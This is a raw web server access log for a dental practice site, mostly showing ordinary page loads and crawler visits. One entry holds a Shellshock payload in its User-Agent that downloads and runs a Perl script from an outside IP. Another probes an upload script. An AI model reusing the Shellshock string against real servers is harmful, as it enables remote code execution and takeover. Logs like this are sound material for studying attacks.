173.66.30.167 - - [16/Dec/2015:09:58:47 -0800] "GET /Bowie-Dentists/css/font/delicious-roman.ttf HTTP/1.1" 404 89 "http://www.superior-dentistry.com/Bowie-Dentists/css/style.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:47 -0800] "GET /Bowie-Dentists/images/patientform.png HTTP/1.1" 200 55911 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:47 -0800] "GET /Bowie-Dentists/images/cut-offer.png HTTP/1.1" 200 986 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:47 -0800] "GET /Bowie-Dentists/images/offer-31-05-2014-sonicare-brush.jpg HTTP/1.1" 200 13165 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:47 -0800] "GET /Bowie-Dentists/images/meetdr2.png HTTP/1.1" 200 61340 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:47 -0800] "GET /Bowie-Dentists/css/images/overlay.png HTTP/1.1" 404 89 "http://www.superior-dentistry.com/Bowie-Dentists/css/style.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:47 -0800] "GET /Bowie-Dentists/images/logo1.jpg HTTP/1.1" 200 37169 "http://www.superior-dentistry.com/Bowie-Dentists/css/style.css" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:48 -0800] "GET /Bowie-Dentists/images/offer-31-05-2014-whitening.jpg HTTP/1.1" 200 15686 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:48 -0800] "GET /Bowie-Dentists/images/offer-31-05-2014-new-patient.jpg HTTP/1.1" 200 15365 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:48 -0800] "GET /Bowie-Dentists/images/fb.png HTTP/1.1" 200 4397 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:48 -0800] "GET /Bowie-Dentists/images/twitter.png HTTP/1.1" 200 5959 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
173.66.30.167 - - [16/Dec/2015:09:58:48 -0800] "GET /Bowie-Dentists/images/Pinterest.png HTTP/1.1" 404 89 "http://www.superior-dentistry.com/Bowie-Dentists/Periodontal-Therapy-Maryland.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36" "www.superior-dentistry.com"
220.181.108.151 - - [16/Dec/2015:11:28:56 -0800] "GET / HTTP/1.1" 200 38156 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.superior-dentistry.com"
208.122.6.102 - - [16/Dec/2015:11:44:20 -0800] "GET / HTTP/1.1" 200 38156 "-" "FreeWebMonitoring SiteChecker/0.2 (+http://www.freewebmonitoring.com/bot.html)" "www.superior-dentistry.com"
64.119.182.235 - - [16/Dec/2015:12:19:44 -0800] "GET /cms/libraries/simplepie/README.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "superior-dentistry.com"
199.59.148.209 - - [16/Dec/2015:12:32:24 -0800] "GET /robots.txt HTTP/1.1" 200 49 "-" "Twitterbot/1.0" "www.superior-dentistry.com"
199.59.148.209 - - [16/Dec/2015:12:32:24 -0800] "GET /images/logo1.jpg HTTP/1.1" 404 89 "-" "Twitterbot/1.0" "www.superior-dentistry.com"
199.59.148.210 - - [16/Dec/2015:12:32:24 -0800] "GET /index.php HTTP/1.1" 200 73 "-" "Twitterbot/1.0" "www.superior-dentistry.com"
208.122.6.102 - - [16/Dec/2015:12:45:33 -0800] "GET / HTTP/1.1" 200 38156 "-" "FreeWebMonitoring SiteChecker/0.2 (+http://www.freewebmonitoring.com/bot.html)" "www.superior-dentistry.com"
123.125.71.41 - - [16/Dec/2015:13:04:52 -0800] "GET / HTTP/1.1" 200 38156 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "superior-dentistry.com"
193.201.227.163 - - [16/Dec/2015:13:19:04 -0800] "GET / HTTP/1.1" 200 38156 "http://superior-dentistry.com/" "Mozilla" "superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET / HTTP/1.1" 200 38156 "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=webhp&cd=25&ved=0ahUKEwjr1cf6qOHJAhVKXB4KHZkaBGw4FBCBTwgqMAQ&url=http%3A%2F%2Fwww.superior-dentistry.com%2F&usg=AFQjCNGF-nEQNHBsad_bRxtFplrZJb5AWQ" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /index.php HTTP/1.1" 200 73 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /favicon.ico HTTP/1.1" 200 688 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/offer-31-05-2014-whitening.jpg HTTP/1.1" 200 15686 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/patients-choice-winner-2015.png HTTP/1.1" 200 9818 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/offer-31-05-2014-new-patient.jpg HTTP/1.1" 200 15365 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/dental-implants.jpg HTTP/1.1" 200 22844 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/oral-pathology.jpg HTTP/1.1" 200 33395 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/meetdr-ali.jpg HTTP/1.1" 200 60533 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/jaw-surgery.jpg HTTP/1.1" 200 27058 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/meetdr-melika.jpg HTTP/1.1" 200 75968 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/wisdom-teeth-extraction.jpg HTTP/1.1" 200 23758 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:09 -0800] "GET /img/slider3.jpg HTTP/1.1" 200 217901 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:10 -0800] "GET /img/logo.jpg HTTP/1.1" 200 139628 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:10 -0800] "GET /js/ie10-viewport-bug-workaround.js HTTP/1.1" 200 694 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:10 -0800] "GET /img/slider2.jpg HTTP/1.1" 200 345766 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:10 -0800] "GET /img/slider1.jpg HTTP/1.1" 200 268888 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:10 -0800] "GET /js/bootstrap.min.js HTTP/1.1" 200 35601 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:10 -0800] "GET /img/offer-31-05-2014-sonicare-brush.jpg HTTP/1.1" 200 13165 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:35:10 -0800] "GET /css/font-awesome.css HTTP/1.1" 200 28747 "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:35:10 -0800] "GET /css/bootstrap.css HTTP/1.1" 200 138415 "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:10 -0800] "GET /css/bootstrap.css HTTP/1.1" 304 - "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:11 -0800] "GET /fonts/fontawesome-webfont.eot HTTP/1.1" 200 60767 "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:11 -0800] "GET /img/zocdoc-apt.jpg HTTP/1.1" 200 79396 "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:29 -0800] "GET /Patient-Before-After-Gallery.html HTTP/1.1" 200 23787 "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:30 -0800] "GET /img/before1.jpg HTTP/1.1" 200 13262 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:30 -0800] "GET /img/before2.jpg HTTP/1.1" 200 12834 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:30 -0800] "GET /img/after1.jpg HTTP/1.1" 200 9920 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:30 -0800] "GET /img/doctor-achievement.jpg HTTP/1.1" 200 200838 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:30 -0800] "GET /img/doc.png HTTP/1.1" 200 26918 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:30 -0800] "GET /img/after2.jpg HTTP/1.1" 200 13168 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:35:30 -0800] "GET /css/procedure-thumb.css HTTP/1.1" 200 2005 "http://www.superior-dentistry.com/Patient-Before-After-Gallery.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:30 -0800] "GET /css/procedure-thumb.css HTTP/1.1" 200 2005 "http://www.superior-dentistry.com/Patient-Before-After-Gallery.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:35:31 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301731478 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/Patient-Before-After-Gallery.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
199.16.156.126 - - [16/Dec/2015:13:35:33 -0800] "GET /images/logo1.jpg HTTP/1.1" 404 89 "-" "Twitterbot/1.0" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:00 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301760260 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/endodontia-root-canal-treatment.jpg HTTP/1.1" 200 126762 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/dental-extractions.jpg HTTP/1.1" 200 165246 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/invisalign.jpg HTTP/1.1" 200 142640 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/bridges-dentist-md.jpg HTTP/1.1" 200 67242 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/periodontalsurgery.jpg HTTP/1.1" 200 56963 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/Lumineers.jpg HTTP/1.1" 200 70250 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/white_composite_filling.jpg HTTP/1.1" 200 105229 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/Teeth-Whitening1.jpg HTTP/1.1" 200 150063 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/dentures.jpg HTTP/1.1" 200 126240 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/SnapOnSmile.jpg HTTP/1.1" 200 71471 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/care3.jpg HTTP/1.1" 200 62411 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:07 -0800] "GET /img/porcelain-veneers.jpg HTTP/1.1" 200 151567 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:36:07 -0800] "GET /js/docs.min.js HTTP/1.1" 200 43299 "http://www.superior-dentistry.com/services.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:36:07 -0800] "GET /js/bootstrap.min.js HTTP/1.1" 200 35601 "http://www.superior-dentistry.com/services.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:36:09 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301769152 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/services.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:20 -0800] "GET /index.html HTTP/1.1" 200 38156 "http://www.superior-dentistry.com/services.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:20 -0800] "GET /index.php HTTP/1.1" 200 73 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:37:20 -0800] "GET /theme.css HTTP/1.1" 200 1926 "http://www.superior-dentistry.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:37:20 -0800] "GET /css/font-awesome.css HTTP/1.1" 200 28747 "http://www.superior-dentistry.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:37:20 -0800] "GET /assets/js/ie8-responsive-file-warning.js HTTP/1.1" 404 89 "http://www.superior-dentistry.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:37:20 -0800] "GET /js/ie-emulation-modes-warning.js HTTP/1.1" 200 2132 "http://www.superior-dentistry.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:21 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301841874 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:33 -0800] "GET /firstvisit.html HTTP/1.1" 200 24042 "http://www.superior-dentistry.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:33 -0800] "GET /img/office-slider4.jpg HTTP/1.1" 200 85815 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:33 -0800] "GET /img/office-slider2.jpg HTTP/1.1" 200 148450 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:33 -0800] "GET /img/office-slider1.jpg HTTP/1.1" 200 134555 "-" "Mozilla/4.0 (compatible;)" "www.superior-dentistry.com"
148.184.187.12 - - [16/Dec/2015:13:37:33 -0800] "GET /theme.css HTTP/1.1" 200 1926 "http://www.superior-dentistry.com/firstvisit.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:37:35 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301855201 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/firstvisit.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
199.16.156.126 - - [16/Dec/2015:13:37:36 -0800] "GET /index.php HTTP/1.1" 200 73 "-" "Twitterbot/1.0" "www.superior-dentistry.com"
199.16.156.124 - - [16/Dec/2015:13:37:36 -0800] "GET /index.php HTTP/1.1" 200 73 "-" "Twitterbot/1.0" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:38:15 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301895195 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/index.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:38:17 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301897457 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/services.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
148.184.174.62 - - [16/Dec/2015:13:38:19 -0800] "GET /assets/flash/ZeroClipboard.swf?noCache=1450301899121 HTTP/1.1" 404 89 "http://www.superior-dentistry.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" "www.superior-dentistry.com"
80.249.133.206 - - [16/Dec/2015:14:09:58 -0800] "POST /assets/modules/evogallery/js/uploadify/uploadify.php HTTP/1.1" 404 89 "http://superior-dentistry.com/assets/modules/evogallery/js/uploadify/uploadify.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2250.61 Safari/537.36" "superior-dentistry.com"
80.249.133.206 - - [16/Dec/2015:14:09:59 -0800] "GET /search.php HTTP/1.1" 200 73 "http://superior-dentistry.com/assets/modules/evogallery/js/uploadify/uploadify.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2250.61 Safari/537.36" "superior-dentistry.com"
108.19.46.6 - - [16/Dec/2015:15:26:44 -0800] "GET /hello HTTP/1.1" 404 89 "-" "() { :;}; /bin/bash -c \"cd /tmp;lwp-download -a http://188.138.41.134/GNUBASH;curl -O http://188.138.41.134/GNUBASH;wget http://188.138.41.134/GNUBASH;perl /tmp/GNUBASH*;perl GNUBASH;rm -rf /tmp/GNUBASH*\"" "superior-dentistry.com"
195.154.169.85 - - [16/Dec/2015:15:59:08 -0800] "GET /robots.txt HTTP/1.1" 200 49 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "superior-dentistry.com"
195.154.169.85 - - [16/Dec/2015:15:59:10 -0800] "GET /Bowie-Dentists-Sitemap.html HTTP/1.1" 200 28353 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "superior-dentistry.com"
195.154.169.85 - - [16/Dec/2015:15:59:13 -0800] "GET /firstvisit.php HTTP/1.1" 200 73 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" "superior-dentistry.com"
